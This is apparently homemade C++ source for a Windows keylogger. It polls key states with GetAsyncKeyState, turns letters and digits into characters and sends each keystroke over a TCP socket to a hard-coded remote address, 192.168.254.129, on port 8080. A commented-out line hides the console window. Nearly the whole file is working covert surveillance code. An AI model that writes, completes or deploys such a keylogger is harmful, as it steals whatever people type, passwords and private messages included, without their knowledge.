#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <unistd.h>
using namespace std;

#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")
#define PORT "8080"

char alphanum [37] = {'0','1','2','3','4','5','6','7','8','9','?','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'};


int main(int argc, char *argv[]) {

	//ShowWindow(GetConsoleWindow(),SW_HIDE);
	
	// ===================================================================
	
	cout << "Creating Socket..." << endl;

	WSADATA wsaData;
	SOCKET ConnectSocket = INVALID_SOCKET;
	struct addrinfo *result = NULL, *ptr = NULL, hints;
	char *sendbuf = NULL;
	int iResult;
	
	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
	if(iResult != 0) {
		cout << "WSAStartup failed with error: " << iResult << endl;
		return 1;
	}
	
	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	
	// Resolve server address and port
	iResult = getaddrinfo("192.168.254.129", PORT, &hints, &result);
	if(iResult != 0) {
		cout << "getaddrinfo failed with error: " << iResult << endl;
		WSACleanup();
		return 1;
	}
	
	// Attempt to connect to address
	ConnectSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
	if(ConnectSocket == INVALID_SOCKET) {
		cout << "Socket failed with error: " << WSAGetLastError();
		WSACleanup();
		return 1;
	}
	
	// Connect to server
	iResult = connect(ConnectSocket, result->ai_addr, (int)result->ai_addrlen);
	if(iResult == SOCKET_ERROR) {
		cout << "Unable to connect to server" << endl;
		closesocket(ConnectSocket);
		ConnectSocket = INVALID_SOCKET;
		return 1;
	}
	cout << "Connected to server" << endl;
	
	freeaddrinfo(result);
	
	// ===================================================================
	
	// Send keylog information to Server

	while(1) {
		
		for(int i=48; i<=91; i++)
			if (GetAsyncKeyState(i)){
				if (i <= 59) {
					cout << alphanum[i-48]; 
					sendbuf = &alphanum[i-48]; 
					iResult = send(ConnectSocket, sendbuf, 1, 0);
					if(iResult == SOCKET_ERROR) {
						cout << "send failed with error: " << WSAGetLastError();
						WSACleanup();
						return 1;
					}
				} else {
				 		cout << alphanum[i-54]; 
						sendbuf = &alphanum[i-54];
						iResult = send(ConnectSocket, sendbuf, 1, 0);
						if(iResult == SOCKET_ERROR) {
						cout << "send failed with error: " << WSAGetLastError();
						WSACleanup();
						return 1;
					}
				}
			}
			
		Sleep(20);		
				
		if(GetAsyncKeyState(27))
			break;
	}
	
	closesocket(ConnectSocket);
	WSACleanup();
		
	return 0;
}
